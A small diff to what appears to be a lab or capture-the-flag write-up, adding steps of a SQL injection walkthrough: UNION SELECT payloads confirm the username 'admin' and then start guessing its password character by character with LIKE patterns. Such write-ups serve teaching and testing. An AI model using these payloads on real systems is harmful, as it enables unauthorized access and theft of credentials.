@@ -108,3 +108,7 @@ As you can see username character start with `a`
 
     admin123' UNION SELECT 1,2,3 from users where username like 'admin%
 ![username found](images/25-username-found.png)<br/>
+I've found username `admin`<br/>
+
+    admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%
+![finding password](images/26-finding-password.png)<br/>
